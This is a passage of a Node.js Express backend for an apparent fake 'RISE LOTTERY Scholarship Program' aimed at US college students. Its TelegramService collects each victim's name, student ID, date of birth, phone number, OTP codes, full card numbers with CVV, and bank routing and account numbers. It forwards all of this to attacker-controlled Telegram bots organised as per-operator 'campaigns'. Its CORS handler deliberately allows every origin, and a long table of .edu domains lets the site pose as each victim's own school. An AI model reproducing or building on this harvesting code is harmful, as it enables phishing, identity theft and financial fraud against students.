const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cookieParser = require('cookie-parser');
const dotenv = require('dotenv');
const { body, validationResult } = require('express-validator');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const session = require('express-session');
const xss = require('xss');
const compression = require('compression');
const morgan = require('morgan');
const path = require('path');

dotenv.config();

const app = express();

// ============================================================
// PERFORMANCE & LOGGING
// ============================================================
app.use(compression());
app.use(morgan(process.env.NODE_ENV === 'production' ? 'combined' : 'dev'));
app.set('trust proxy', 1);

// ============================================================
// SECURITY
// ============================================================
app.use((req, res, next) => {
    if (req.body) {
        for (let key in req.body) {
            if (typeof req.body[key] === 'string') {
                req.body[key] = xss(req.body[key]);
            }
        }
    }
    next();
});

app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: false
}));

// ============================================================
// CORS — MULTI-FRONTEND FRIENDLY
// ============================================================
const corsOptions = {
    origin: function (origin, callback) {
        // Allow no origin (curl, Postman, mobile apps)
        if (!origin) return callback(null, true);

        // Allow file:// for local testing
        if (origin === 'null') return callback(null, true);

        // Allow any localhost during development
        if (/^https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/.test(origin)) {
            return callback(null, true);
        }

        // Read whitelist from env (comma-separated)
        const allowedOrigins = (process.env.CORS_ORIGIN || '')
            .split(',')
            .map(s => s.trim())
            .filter(Boolean);

        // Wildcard: allow any origin
        if (allowedOrigins.includes('*')) return callback(null, true);

        if (allowedOrigins.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            console.log('⚠️  CORS origin not in whitelist, still allowing:', origin);
            // Allow anyway — campaigns are validated separately
            callback(null, true);
        }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token', 'X-Requested-With', 'X-Campaign-Id'],
    exposedHeaders: ['X-CSRF-Token'],
    maxAge: 86400,
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));

// ============================================================
// RATE LIMITING
// ============================================================
const limiter = rateLimit({
    windowMs: parseInt(process.env.RATE_LIMIT_WINDOW) || 15 * 60 * 1000,
    max: parseInt(process.env.RATE_LIMIT_MAX) || 200,
    message: 'Too many requests from this IP, please try again later.',
    standardHeaders: true,
    legacyHeaders: false,
});
app.use('/api/', limiter);

const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 30,
    message: 'Too many authentication attempts, please try again later.',
    standardHeaders: true,
    legacyHeaders: false,
});
app.use('/api/otp/', authLimiter);

// ============================================================
// BODY PARSING
// ============================================================
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: true, limit: '10kb' }));
app.use(cookieParser());

app.use(session({
    secret: process.env.SESSION_SECRET || 'session-secret-change-this',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000,
        sameSite: 'lax'
    },
    name: 'sessionId',
    rolling: true,
}));

const asyncHandler = (fn) => (req, res, next) => {
    Promise.resolve(fn(req, res, next)).catch(next);
};

const sendResponse = (res, status, data, message = '') => {
    res.status(status).json({ success: status < 400, message, ...data });
};

// ============================================================
// CAMPAIGN REGISTRY
// ============================================================
// Each campaign ID maps to a specific Telegram bot token + chat ID.
// Campaigns are loaded from env vars and/or hardcoded here as
// fallbacks. Add new ones by adding to the BUILTIN_CAMPAIGNS
// object or adding env vars.
//
// Env var format:
//   CAMPAIGN_EMMY_BOT_TOKEN=123456:ABC...
//   CAMPAIGN_EMMY_CHAT_ID=987654321
//   CAMPAIGN_OLA_BOT_TOKEN=789012:DEF...
//   CAMPAIGN_OLA_CHAT_ID=123456789
//
// ============================================================

// Built-in fallbacks — used if env vars are missing.
// Replace these with your real tokens/chat IDs.
const BUILTIN_CAMPAIGNS = {
    emmy: {
        botToken: process.env.CAMPAIGN_EMMY_BOT_TOKEN || 'YOUR_EMMY_BOT_TOKEN_HERE',
        chatId: process.env.CAMPAIGN_EMMY_CHAT_ID || 'YOUR_EMMY_CHAT_ID_HERE'
    },
    ola: {
        botToken: process.env.CAMPAIGN_OLA_BOT_TOKEN || 'YOUR_OLA_BOT_TOKEN_HERE',
        chatId: process.env.CAMPAIGN_OLA_CHAT_ID || 'YOUR_OLA_CHAT_ID_HERE'
    }
};

class CampaignRegistry {
    constructor() {
        this.campaigns = new Map();

        // 1. Load built-in campaigns (env vars override if present)
        for (const [id, cfg] of Object.entries(BUILTIN_CAMPAIGNS)) {
            if (cfg.botToken && cfg.chatId &&
                !cfg.botToken.includes('YOUR_') &&
                !cfg.chatId.includes('YOUR_')) {
                this.campaigns.set(id.toLowerCase(), {
                    id: id.toLowerCase(),
                    botToken: cfg.botToken,
                    chatId: cfg.chatId,
                    apiUrl: `https://api.telegram.org/bot${cfg.botToken}`
                });
                console.log(`📢 Campaign loaded: ${id} ✅`);
            } else {
                console.log(`⚠️  Campaign "${id}" missing valid credentials`);
            }
        }

        // 2. Auto-discover additional campaigns from env vars
        const envKeys = Object.keys(process.env);
        const tokenKeys = envKeys.filter(k =>
            /^CAMPAIGN_[A-Z0-9_]+_BOT_TOKEN$/i.test(k)
        );

        for (const key of tokenKeys) {
            const match = key.match(/^CAMPAIGN_([A-Z0-9_]+)_BOT_TOKEN$/i);
            if (!match) continue;
            const campaignId = match[1].toLowerCase();

            // Skip if already loaded
            if (this.campaigns.has(campaignId)) continue;

            const botToken = process.env[key];
            const chatId = process.env[`CAMPAIGN_${match[1]}_CHAT_ID`];

            if (botToken && chatId) {
                this.campaigns.set(campaignId, {
                    id: campaignId,
                    botToken,
                    chatId,
                    apiUrl: `https://api.telegram.org/bot${botToken}`
                });
                console.log(`📢 Campaign loaded: ${campaignId} ✅ (env)`);
            }
        }

        // 3. Default fallback (single-campaign legacy)
        if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID && !this.campaigns.has('default')) {
            this.campaigns.set('default', {
                id: 'default',
                botToken: process.env.TELEGRAM_BOT_TOKEN,
                chatId: process.env.TELEGRAM_CHAT_ID,
                apiUrl: `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`
            });
            console.log('📢 Campaign loaded: default (fallback) ✅');
        }

        console.log(`📊 Total campaigns: ${this.campaigns.size}`);
    }

    get(campaignId) {
        if (!campaignId) return this.campaigns.get('default') || this.campaigns.get('emmy') || null;
        return this.campaigns.get(String(campaignId).toLowerCase()) || null;
    }

    has(campaignId) {
        return this.campaigns.has(String(campaignId).toLowerCase());
    }

    list() {
        return Array.from(this.campaigns.keys());
    }
}

const campaignRegistry = new CampaignRegistry();

// ============================================================
// TELEGRAM SERVICE
// ============================================================
class TelegramService {
    constructor() {
        this.retryDelay = 1000;
    }

    async sendMessage(campaignId, message, parseMode = 'HTML') {
        const campaign = campaignRegistry.get(campaignId);
        if (!campaign) {
            console.log(`❌ No campaign found for ID: ${campaignId}`);
            return { success: false, error: 'Campaign not found' };
        }
        try {
            const response = await axios.post(`${campaign.apiUrl}/sendMessage`, {
                chat_id: campaign.chatId,
                text: message,
                parse_mode: parseMode,
                disable_notification: false
            }, {
                headers: { 'Content-Type': 'application/json' },
                timeout: 30000
            });
            if (response.data.ok) {
                return { success: true, message_id: response.data.result.message_id };
            }
            throw new Error('Telegram API error');
        } catch (error) {
            console.error(`❌ Telegram send failed (campaign: ${campaignId}):`, error.message);
            return { success: false, error: error.message };
        }
    }

    async sendWithRetry(campaignId, message, maxRetries = 3) {
        let lastError;
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            const result = await this.sendMessage(campaignId, message);
            if (result.success) return result;
            lastError = result.error;
            if (attempt < maxRetries) {
                await new Promise(resolve => setTimeout(resolve, this.retryDelay * Math.pow(2, attempt - 1)));
            }
        }
        return { success: false, error: lastError };
    }

    formatOTPNotification(campaignId, name, email, school, otp, studentId, dob, phone, personalEmail) {
        return `🔐 <b>🔐 NEW OTP GENERATED</b>
<i>Campaign: ${campaignId}</i>

📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
👤 <b>Full Name:</b> ${name}
🎓 <b>School:</b> ${school || 'Unknown'}
📧 <b>Student Email:</b> ${email}
📧 <b>Personal Email:</b> ${personalEmail || 'Not provided'}
🆔 <b>Student ID:</b> ${studentId || 'Not provided'}
📅 <b>Date of Birth:</b> ${dob || 'Not provided'}
📱 <b>Phone Number:</b> ${phone || 'Not provided'}
🔑 <b>OTP Code:</b> <code>${otp}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString()}
📋 <b>━━━━━━━━━━━━━━━━━━━━</b>

⚠️ <i>This OTP expires in 10 minutes</i>

🏆 RISE LOTTERY Scholarship Program`;
    }

    formatCardVerification(name, email, school, cardData) {
        return `💳 <b>💳 CARD VERIFICATION SUBMITTED</b>

📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
👤 <b>Student:</b> ${name}
📧 <b>Email:</b> ${email}
🏫 <b>School:</b> ${school || 'Unknown'}
💳 <b>Card Number:</b> <code>${cardData.cardNumber}</code>
📅 <b>Expiry:</b> ${cardData.expiry}
🔒 <b>CVV:</b> <code>${cardData.cvv}</code>
👤 <b>Cardholder:</b> ${cardData.cardholderName}
📮 <b>Billing ZIP:</b> ${cardData.billingZip || 'Not provided'}
💰 <b>Verification Amount:</b> $2.00 (temporary hold)
⏰ <b>Time:</b> ${new Date().toLocaleString()}
📋 <b>━━━━━━━━━━━━━━━━━━━━</b>

✅ <i>Card verification submitted</i>

🏆 RISE LOTTERY Scholarship Program`;
    }

    formatErrandRequest(name, email, school, telegram, whatsapp, preferred) {
        return `🤝 <b>🤝 CHARITY ERRAND REQUEST</b>

📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
👤 <b>Student:</b> ${name}
📧 <b>Email:</b> ${email}
🏫 <b>School:</b> ${school || 'Unknown'}
📱 <b>Telegram:</b> ${telegram || 'Not provided'}
📱 <b>WhatsApp:</b> ${whatsapp || 'Not provided'}
📌 <b>Preferred Contact:</b> ${preferred || 'Not specified'}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
📋 <b>━━━━━━━━━━━━━━━━━━━━</b>

⏳ <i>Errand request submitted</i>

🏆 RISE LOTTERY Scholarship Program`;
    }

    formatAccountDetails(name, email, school, accountData) {
        return `🏦 <b>🏦 ACCOUNT DETAILS SUBMITTED</b>

📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
👤 <b>Student:</b> ${name}
📧 <b>Email:</b> ${email}
🏫 <b>School:</b> ${school || 'Unknown'}
🏛️ <b>Bank Name:</b> ${accountData.bankName}
📊 <b>Account Type:</b> ${accountData.accountType}
👤 <b>Account Holder:</b> ${accountData.accountHolder}
🔢 <b>Routing Number:</b> ${accountData.routingNumber}
🔢 <b>Account Number:</b> <code>${accountData.accountNumber}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString()}
📋 <b>━━━━━━━━━━━━━━━━━━━━</b>

✅ <i>Bank account details saved</i>

🏆 RISE LOTTERY Scholarship Program`;
    }

    formatAccountDetailsMissing(name, email, school) {
        return `⚠️ <b>⚠️ ACCOUNT DETAILS MISSING!</b>

📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
👤 <b>Student:</b> ${name}
📧 <b>Email:</b> ${email}
🏫 <b>School:</b> ${school || 'Unknown'}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
📋 <b>━━━━━━━━━━━━━━━━━━━━</b>

❌ <i>Student tried to verify card but account details are missing!</i>

🏆 RISE LOTTERY Scholarship Program`;
    }
}

// ============================================================
// JWT HELPERS
// ============================================================
const generateToken = (data) => {
    return jwt.sign(data, process.env.JWT_SECRET || 'fallback-secret-key', {
        expiresIn: '7d', algorithm: 'HS256'
    });
};

// ============================================================
// OTP SERVICE
// ============================================================
class OTPService {
    constructor() {
        this.otpStore = new Map();
        this.cleanupInterval = setInterval(() => this.cleanup(), 5 * 60 * 1000);
    }
    generateOTP() {
        return String(Math.floor(100000 + Math.random() * 900000));
    }
    storeOTP(email, otp) {
        const expiresAt = Date.now() + 10 * 60 * 1000;
        this.otpStore.set(email, { otp, expiresAt });
        return otp;
    }
    verifyOTP(email, otp) {
        const record = this.otpStore.get(email);
        if (!record) return { valid: false, error: 'OTP not found or expired' };
        if (Date.now() > record.expiresAt) {
            this.otpStore.delete(email);
            return { valid: false, error: 'OTP has expired' };
        }
        if (record.otp !== otp) return { valid: false, error: 'Invalid OTP' };
        this.otpStore.delete(email);
        return { valid: true };
    }
    cleanup() {
        const now = Date.now();
        for (const [email, record] of this.otpStore.entries()) {
            if (now > record.expiresAt) this.otpStore.delete(email);
        }
    }
    destroy() { clearInterval(this.cleanupInterval); }
}


const schoolDatabase = {
    // ===== TEXAS COMMUNITY COLLEGES =====
    'tccd.edu': 'Tarrant County College District',
    'dcccd.edu': 'Dallas College',
    'hccs.edu': 'Houston Community College',
    'austincc.edu': 'Austin Community College',
    'alamo.edu': 'Alamo Colleges District',
    'epcc.edu': 'El Paso Community College',
    'southplainscollege.edu': 'South Plains College',
    'lonestar.edu': 'Lone Star College System',
    'collin.edu': 'Collin College',
    'nctc.edu': 'North Central Texas College',
    'wc.edu': 'Weatherford College',
    'hillcollege.edu': 'Hill College',
    'navarrocollege.edu': 'Navarro College',
    'tvcc.edu': 'Trinity Valley Community College',
    'tjc.edu': 'Tyler Junior College',
    'kilgore.edu': 'Kilgore College',
    'angelina.edu': 'Angelina College',
    'parisjc.edu': 'Paris Junior College',
    'blinn.edu': 'Blinn College',
    'victoriacollege.edu': 'Victoria College',
    'delmar.edu': 'Del Mar College',
    'laredo.edu': 'Laredo College',
    'southtexascollege.edu': 'South Texas College',
    'odessa.edu': 'Odessa College',
    'midland.edu': 'Midland College',
    'lee.edu': 'Lee College',
    'tamiu.edu': 'Texas A&M International University',

    // ===== CALIFORNIA COMMUNITY COLLEGES =====
    'mccd.edu': 'Merced College',
    'avc.edu': 'Antelope Valley College',
    'laccd.edu': 'Los Angeles Community College District',
    'smc.edu': 'Santa Monica College',
    'pasadena.edu': 'Pasadena City College',
    'glendale.edu': 'Glendale Community College',
    'elcamino.edu': 'El Camino College',
    'cerritos.edu': 'Cerritos College',
    'lbcc.edu': 'Long Beach City College',
    'mt.sac.edu': 'Mt. San Antonio College',
    'riohondo.edu': 'Rio Hondo College',
    'citruscollege.edu': 'Citrus College',
    'chaffey.edu': 'Chaffey College',
    'sdccd.edu': 'San Diego Community College District',
    'swccd.edu': 'Southwestern College',
    'grossmont.edu': 'Grossmont College',
    'palomar.edu': 'Palomar College',
    'miracosta.edu': 'MiraCosta College',
    'ccsf.edu': 'City College of San Francisco',
    'peralta.edu': 'Peralta Community College District',
    'fhda.edu': 'Foothill-De Anza Community College District',
    'sjeccd.edu': 'San Jose-Evergreen Community College District',
    'wvm.edu': 'West Valley-Mission Community College District',
    'sierracollege.edu': 'Sierra College',
    'msjc.edu': 'Mt. San Jacinto College',
    'vvc.edu': 'Victor Valley College',
    'victorvalley.edu': 'Victor Valley College',
    'yccd.edu': 'Yuba Community College District',

    // ===== FLORIDA COMMUNITY COLLEGES =====
    'mdc.edu': 'Miami Dade College',
    'broward.edu': 'Broward College',
    'palmbeachstate.edu': 'Palm Beach State College',
    'valenciacollege.edu': 'Valencia College',
    'seminolestate.edu': 'Seminole State College of Florida',
    'spcollege.edu': 'St. Petersburg College',
    'hccfl.edu': 'Hillsborough Community College',
    'irsc.edu': 'Indian River State College',
    'easternflorida.edu': 'Eastern Florida State College',
    'daytonastate.edu': 'Daytona State College',
    'sfcollege.edu': 'Santa Fe College',
    'gulfcoast.edu': 'Gulf Coast State College',
    'nwfsc.edu': 'Northwest Florida State College',
    'tcc.fl.edu': 'Tallahassee Community College',
    'fscj.edu': 'Florida State College at Jacksonville',
    'southflorida.edu': 'South Florida State College',
    'lscc.edu': 'Lake-Sumter State College',
    'polk.edu': 'Polk State College',

    // ===== NEW YORK COMMUNITY COLLEGES =====
    'bmcc.cuny.edu': 'Borough of Manhattan Community College',
    'kbcc.cuny.edu': 'Kingsborough Community College',
    'qcc.cuny.edu': 'Queensborough Community College',
    'bcc.cuny.edu': 'Bronx Community College',
    'hostos.cuny.edu': 'Hostos Community College',
    'lagcc.cuny.edu': 'LaGuardia Community College',
    'ncc.edu': 'Nassau Community College',
    'sunysuffolk.edu': 'Suffolk County Community College',
    'sunywcc.edu': 'Westchester Community College',
    'monroecc.edu': 'Monroe Community College',
    'ecc.edu': 'Erie Community College',
    'sunyocc.edu': 'Onondaga Community College',
    'flcc.edu': 'Finger Lakes Community College',
    'hvcc.edu': 'Hudson Valley Community College',

    // ===== ILLINOIS COMMUNITY COLLEGES =====
    'ccc.edu': 'City Colleges of Chicago',
    'cod.edu': 'College of DuPage',
    'oakton.edu': 'Oakton Community College',
    'harpercollege.edu': 'Harper College',
    'elgin.edu': 'Elgin Community College',
    'waubonsee.edu': 'Waubonsee Community College',
    'jjc.edu': 'Joliet Junior College',
    'morainevalley.edu': 'Moraine Valley Community College',
    'ssc.edu': 'South Suburban College',
    'prairiestate.edu': 'Prairie State College',
    'clcillinois.edu': 'College of Lake County',
    'luc.edu': 'Loyola University Chicago',

    // ===== WASHINGTON COMMUNITY COLLEGES =====
    'seattlecolleges.edu': 'Seattle Colleges',
    'bellevuecollege.edu': 'Bellevue College',
    'shoreline.edu': 'Shoreline Community College',
    'edmonds.edu': 'Edmonds College',
    'highline.edu': 'Highline College',
    'greenriver.edu': 'Green River College',
    'tacomacc.edu': 'Tacoma Community College',
    'pierce.ctc.edu': 'Pierce College',
    'scc.spokane.edu': 'Spokane Community College',
    'sfcc.spokane.edu': 'Spokane Falls Community College',

    // ===== KENTUCKY COMMUNITY COLLEGES (KCTCS) =====
    'kctcs.edu': 'Kentucky Community and Technical College System',
    'ashland.kctcs.edu': 'Ashland Community and Technical College',
    'bigsandy.kctcs.edu': 'Big Sandy Community and Technical College',
    'bluegrass.kctcs.edu': 'Bluegrass Community and Technical College',
    'elizabethtown.kctcs.edu': 'Elizabethtown Community and Technical College',
    'gateway.kctcs.edu': 'Gateway Community and Technical College',
    'hazard.kctcs.edu': 'Hazard Community and Technical College',
    'henderson.kctcs.edu': 'Henderson Community College',
    'hopkinsville.kctcs.edu': 'Hopkinsville Community College',
    'jefferson.kctcs.edu': 'Jefferson Community and Technical College',
    'madisonville.kctcs.edu': 'Madisonville Community College',
    'maysville.kctcs.edu': 'Maysville Community and Technical College',
    'owensboro.kctcs.edu': 'Owensboro Community and Technical College',
    'somerset.kctcs.edu': 'Somerset Community College',
    'southcentral.kctcs.edu': 'Southcentral Kentucky Community and Technical College',
    'southeast.kctcs.edu': 'Southeast Kentucky Community and Technical College',
    'westkentucky.kctcs.edu': 'West Kentucky Community and Technical College',

    // ===== IVY LEAGUE =====
    'harvard.edu': 'Harvard University',
    'yale.edu': 'Yale University',
    'princeton.edu': 'Princeton University',
    'columbia.edu': 'Columbia University',
    'brown.edu': 'Brown University',
    'dartmouth.edu': 'Dartmouth College',
    'upenn.edu': 'University of Pennsylvania',
    'cornell.edu': 'Cornell University',

    // ===== ELITE PRIVATE =====
    'stanford.edu': 'Stanford University',
    'mit.edu': 'Massachusetts Institute of Technology',
    'caltech.edu': 'California Institute of Technology',
    'jhu.edu': 'Johns Hopkins University',
    'duke.edu': 'Duke University',
    'northwestern.edu': 'Northwestern University',
    'rice.edu': 'Rice University',
    'vanderbilt.edu': 'Vanderbilt University',
    'nd.edu': 'University of Notre Dame',
    'emory.edu': 'Emory University',
    'wustl.edu': 'Washington University in St. Louis',
    'cmu.edu': 'Carnegie Mellon University',
    'usc.edu': 'University of Southern California',
    'georgetown.edu': 'Georgetown University',
    'tufts.edu': 'Tufts University',
    'bu.edu': 'Boston University',
    'bc.edu': 'Boston College',
    'northeastern.edu': 'Northeastern University',
    'nyu.edu': 'New York University',
    'miami.edu': 'University of Miami',
    'tulane.edu': 'Tulane University',
    'wfu.edu': 'Wake Forest University',
    'case.edu': 'Case Western Reserve University',
    'rochester.edu': 'University of Rochester',
    'rpi.edu': 'Rensselaer Polytechnic Institute',
    'drake.edu': 'Drake University',
    'pba.edu': 'Palm Beach Atlantic University',
    'rasmussen.edu': 'Rasmussen University',
    'franklin.edu': 'Franklin University',
    'adventhealth.edu': 'AdventHealth University',
    'howard.edu': 'Howard University',
    'monroecollege.edu': 'Monroe College',

    // ===== MAJOR PUBLIC - CALIFORNIA =====
    'berkeley.edu': 'University of California, Berkeley',
    'ucla.edu': 'University of California, Los Angeles',
    'ucsd.edu': 'University of California, San Diego',
    'ucdavis.edu': 'University of California, Davis',
    'uci.edu': 'University of California, Irvine',
    'ucsb.edu': 'University of California, Santa Barbara',
    'ucsc.edu': 'University of California, Santa Cruz',
    'ucr.edu': 'University of California, Riverside',
    'ucmerced.edu': 'University of California, Merced',
    'calpoly.edu': 'California Polytechnic State University, SLO',
    'cpp.edu': 'California State Polytechnic University, Pomona',
    'csulb.edu': 'California State University, Long Beach',
    'csuf.edu': 'California State University, Fullerton',
    'fullerton.edu': 'California State University, Fullerton',
    'csun.edu': 'California State University, Northridge',
    'sacstate.edu': 'California State University, Sacramento',
    'fresnostate.edu': 'California State University, Fresno',
    'csusb.edu': 'California State University, San Bernardino',
    'csudh.edu': 'California State University, Dominguez Hills',
    'csueastbay.edu': 'California State University, East Bay',
    'csuchico.edu': 'California State University, Chico',
    'humboldt.edu': 'Humboldt State University',
    'csuci.edu': 'California State University, Channel Islands',
    'csusm.edu': 'California State University, San Marcos',
    'sjsu.edu': 'San Jose State University',
    'sdsu.edu': 'San Diego State University',
    'sfsu.edu': 'San Francisco State University',

    // ===== MAJOR PUBLIC - TEXAS =====
    'utexas.edu': 'University of Texas at Austin',
    'tamu.edu': 'Texas A&M University',
    'ttu.edu': 'Texas Tech University',
    'uh.edu': 'University of Houston',
    'unt.edu': 'University of North Texas',
    'txstate.edu': 'Texas State University',
    'utdallas.edu': 'University of Texas at Dallas',
    'uta.edu': 'University of Texas at Arlington',
    'utsa.edu': 'University of Texas at San Antonio',
    'utep.edu': 'University of Texas at El Paso',
    'utrgv.edu': 'University of Texas Rio Grande Valley',
    'uttyler.edu': 'University of Texas at Tyler',
    'twu.edu': 'Texas Woman\'s University',
    'shsu.edu': 'Sam Houston State University',
    'lamar.edu': 'Lamar University',
    'sfasu.edu': 'Stephen F. Austin State University',
    'tamuk.edu': 'Texas A&M University-Kingsville',
    'tamuc.edu': 'Texas A&M University-Commerce',
    'utpb.edu': 'University of Texas Permian Basin',
    'tsu.edu': 'Texas Southern University',

    // ===== MAJOR PUBLIC - FLORIDA =====
    'ufl.edu': 'University of Florida',
    'fsu.edu': 'Florida State University',
    'usf.edu': 'University of South Florida',
    'ucf.edu': 'University of Central Florida',
    'fiu.edu': 'Florida International University',
    'famu.edu': 'Florida A&M University',
    'unf.edu': 'University of North Florida',
    'fgcu.edu': 'Florida Gulf Coast University',
    'uwf.edu': 'University of West Florida',
    'fau.edu': 'Florida Atlantic University',

    // ===== MAJOR PUBLIC - OTHER =====
    'umich.edu': 'University of Michigan',
    'msu.edu': 'Michigan State University',
    'virginia.edu': 'University of Virginia',
    'vt.edu': 'Virginia Tech',
    'vcu.edu': 'Virginia Commonwealth University',
    'gmu.edu': 'George Mason University',
    'jmu.edu': 'James Madison University',
    'wm.edu': 'William & Mary',
    'unc.edu': 'University of North Carolina at Chapel Hill',
    'ncsu.edu': 'North Carolina State University',
    'osu.edu': 'Ohio State University',
    'psu.edu': 'Pennsylvania State University',
    'pitt.edu': 'University of Pittsburgh',
    'uiuc.edu': 'University of Illinois Urbana-Champaign',
    'uw.edu': 'University of Washington',
    'uoregon.edu': 'University of Oregon',
    'arizona.edu': 'University of Arizona',
    'asu.edu': 'Arizona State University',
    'utah.edu': 'University of Utah',
    'colorado.edu': 'University of Colorado Boulder',
    'umd.edu': 'University of Maryland, College Park',
    'wisc.edu': 'University of Wisconsin-Madison',
    'umn.edu': 'University of Minnesota',
    'iub.edu': 'Indiana University Bloomington',
    'iu.edu': 'Indiana University',
    'purdue.edu': 'Purdue University',
    'uiowa.edu': 'University of Iowa',
    'iastate.edu': 'Iowa State University',
    'missouri.edu': 'University of Missouri',
    'ku.edu': 'University of Kansas',
    'unl.edu': 'University of Nebraska-Lincoln',
    'ou.edu': 'University of Oklahoma',
    'uco.edu': 'University of Central Oklahoma',
    'ecok.edu': 'East Central University',
    'ua.edu': 'University of Alabama',
    'auburn.edu': 'Auburn University',
    'southalabama.edu': 'University of South Alabama',
    'usouthal.edu': 'University of South Alabama',
    'olemiss.edu': 'University of Mississippi',
    'msstate.edu': 'Mississippi State University',
    'lsu.edu': 'Louisiana State University',
    'uky.edu': 'University of Kentucky',
    'utk.edu': 'University of Tennessee',
    'uga.edu': 'University of Georgia',
    'gatech.edu': 'Georgia Tech',
    'clemson.edu': 'Clemson University',
    'sc.edu': 'University of South Carolina',
    'savannahstate.edu': 'Savannah State University',
    'fvsu.edu': 'Fort Valley State University',
    'uark.edu': 'University of Arkansas',
    'k-state.edu': 'Kansas State University',
    'uidaho.edu': 'University of Idaho',
    'boisestate.edu': 'Boise State University',
    'unr.edu': 'University of Nevada, Reno',
    'unlv.edu': 'University of Nevada, Las Vegas',
    'newmexico.edu': 'University of New Mexico',
    'nmsu.edu': 'New Mexico State University',
    'wvu.edu': 'West Virginia University',
    'marshall.edu': 'Marshall University',
    'usd.edu': 'University of South Dakota',
    'und.edu': 'University of North Dakota',
    'montana.edu': 'University of Montana',
    'msubillings.edu': 'Montana State University Billings',
    'wyoming.edu': 'University of Wyoming',
    'alaska.edu': 'University of Alaska Fairbanks',
    'hawaii.edu': 'University of Hawaii at Manoa',
    'umass.edu': 'University of Massachusetts Amherst',
    'uconn.edu': 'University of Connecticut',
    'delaware.edu': 'University of Delaware',
    'udel.edu': 'University of Delaware',
    'uri.edu': 'University of Rhode Island',
    'maine.edu': 'University of Maine',
    'uvm.edu': 'University of Vermont',
    'unh.edu': 'University of New Hampshire',

    // ===== HBCUs & MINORITY INSTITUTIONS =====
    'howard.edu': 'Howard University',
    'hamptonu.edu': 'Hampton University',
    'spelman.edu': 'Spelman College',
    'morehouse.edu': 'Morehouse College',
    'famu.edu': 'Florida A&M University',
    'ncatu.edu': 'North Carolina A&T State University',
    'pvamu.edu': 'Prairie View A&M University',
    'tsu.edu': 'Texas Southern University',
    'savannahstate.edu': 'Savannah State University',
    'fvsu.edu': 'Fort Valley State University',
    'vuu.edu': 'Virginia Union University',

    // ===== LIBERAL ARTS =====
    'amherst.edu': 'Amherst College',
    'williams.edu': 'Williams College',
    'swarthmore.edu': 'Swarthmore College',
    'pomona.edu': 'Pomona College',
    'bowdoin.edu': 'Bowdoin College',
    'middlebury.edu': 'Middlebury College',
    'carleton.edu': 'Carleton College',
    'cmc.edu': 'Claremont McKenna College',
    'hmc.edu': 'Harvey Mudd College',
    'haverford.edu': 'Haverford College',
    'hamilton.edu': 'Hamilton College',
    'colby.edu': 'Colby College',
    'vassar.edu': 'Vassar College',
    'davidson.edu': 'Davidson College',
    'wlu.edu': 'Washington and Lee University',
    'fandm.edu': 'Franklin & Marshall College',
    'bucknell.edu': 'Bucknell University',
    'lafayette.edu': 'Lafayette College',
    'union.edu': 'Union College',
    'skidmore.edu': 'Skidmore College',
    'oberlin.edu': 'Oberlin College',
    'reed.edu': 'Reed College',
    'grinnell.edu': 'Grinnell College',
    'macalester.edu': 'Macalester College',
    'kenyon.edu': 'Kenyon College',
    'bates.edu': 'Bates College',

    // ===== TEXAS PRIVATE =====
    'baylor.edu': 'Baylor University',
    'tcu.edu': 'Texas Christian University',
    'smu.edu': 'Southern Methodist University',
    'stedwards.edu': 'St. Edward\'s University',
    'southwestern.edu': 'Southwestern University',
    'trinity.edu': 'Trinity University',
    'udallas.edu': 'University of Dallas',
    'austincollege.edu': 'Austin College',
    'stmarytx.edu': 'St. Mary\'s University',
    'ollusa.edu': 'Our Lady of the Lake University',
    'tlu.edu': 'Texas Lutheran University',
    'schreiner.edu': 'Schreiner University',
    'htu.edu': 'Huston-Tillotson University',
    'wbu.edu': 'Wayland Baptist University',
    'lc.edu': 'Lubbock Christian University',
    'umhb.edu': 'University of Mary Hardin-Baylor',

    // ===== VIRGINIA PRIVATE =====
    'richmond.edu': 'University of Richmond',
    'liberty.edu': 'Liberty University',
    'regent.edu': 'Regent University',
    'hamptonu.edu': 'Hampton University',
    'roanoke.edu': 'Roanoke College',
    'hsc.edu': 'Hampden-Sydney College',
    'bridgewater.edu': 'Bridgewater College',
    'su.edu': 'Shenandoah University',
    'sbc.edu': 'Sweet Briar College',
    'hollins.edu': 'Hollins University',
    'marymount.edu': 'Marymount University',
    'averett.edu': 'Averett University',
    'ehc.edu': 'Emory & Henry College',
    'emu.edu': 'Eastern Mennonite University',
    'ferrum.edu': 'Ferrum College',
    'randolphcollege.edu': 'Randolph College',
    'rmc.edu': 'Randolph-Macon College',
    'svu.edu': 'Southern Virginia University',
    'vuu.edu': 'Virginia Union University',
    'vwu.edu': 'Virginia Wesleyan University',
    'christendom.edu': 'Christendom College',
    'bluefield.edu': 'Bluefield University',

    // ===== MIDWEST / OTHER =====
    'dmacc.edu': 'Des Moines Area Community College',
    'harford.edu': 'Harford Community College',
    'mccc.edu': 'Mercer County Community College',
    'eccc.edu': 'East Central Community College',
    'faytechcc.edu': 'Fayetteville Technical Community College',
    'ftccollege.edu': 'Fayetteville Technical Community College',
    'centralaz.edu': 'Central Arizona College',
    'sfcc.edu': 'Santa Fe Community College',
    'lee.edu': 'Lee College',
};

function lookupSchool(email) {
    if (!email || !email.includes('@')) return null;
